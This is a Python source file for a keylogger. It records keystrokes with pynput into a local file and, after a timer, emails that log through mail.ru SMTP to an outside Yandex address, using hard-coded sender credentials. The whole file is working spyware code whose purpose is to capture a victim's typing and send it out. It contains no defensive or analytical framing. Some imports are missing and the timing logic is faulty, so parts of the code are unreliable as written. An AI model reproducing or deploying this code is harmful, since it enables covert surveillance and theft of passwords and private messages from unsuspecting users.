import time

from pynput import keyboard
from email.mime.audio import MIMEAudio
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
    msg = MIMEMultipart()
    addr_from = "responder49@mail.ru"
    password = "BSL5cwjyiDD5WsJXbWQv"

    # msg = MIMEMultipart()
    msg['From'] = addr_from
    msg['To'] = addr_to
    msg['Subject'] = msg_subj

    body = msg_text
    msg.attach(MIMEText(body, 'plain'))

    # process_attachement(msg, files)
    try:
        atach_file(msg, f1le)
    except:
        pass

    server = smtplib.SMTP_SSL('smtp.mail.ru')
    # server.starttls()
    # server.set_debuglevel(True)
    server.login(addr_from, password)
    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)
    server.quit()


def atach_file(msg, filepath):
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)
    if maintype == 'text':
        with open(filepath, "r", encoding="utf-8") as fp:
            file = MIMEText(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'image':
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'audio':
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'application':
        if subtype == 'x-zip-compressed':
            part = MIMEBase("application", "octet-stream")
            part.set_payload(open("m.zip", "rb").read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", "attachment; filename=\"m.zip\"")
            msg.attach(part)
    file.add_header('Content-Disposition', 'attachment', filename=(filepath.split("\\"))[-1])


class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:
        self.filename = filename
        self.spec_keys = {
            "Key.up": "\n^\n",
            "Key.down": "\nv\n",
            "Key.left": "\n<\n",
            "Key.right": "\n>\n",
            "Key.enter": "\n",
            "Key.space": " ",
            "Key.esc": "\n'esc'\n",
            "Key.backspace": "\nKey.backspace\n",
            "Key.ctrl_l": "\nKey.ctrl_l\n",
            "Key.ctrl_r": "\nKey.ctrl_r\n",
        }

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        # print(key)
        with open(self.filename, 'a') as logs:
            if "Key" in self.get_char(key):
                k = self.spec_keys[self.get_char(key)]
            else:
                k = self.get_char(key)
            logs.write(k)

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        time.sleep(2)


def send():
    t = time.time()
    if time.time() - t >= 60:
        send_email("verart1@yandex.ru", "keylogs.txt", "Test", "keylog")
        t = time.time()

if __name__ == '__main__':
    t = time.time()
    logger = KeyLogger()
    logger.main()
    while True:
        if time.time() - t >= 60 * (40):
            send_email("verart1@yandex.ru", "keylogs.txt", "Test", "keylog")
            break
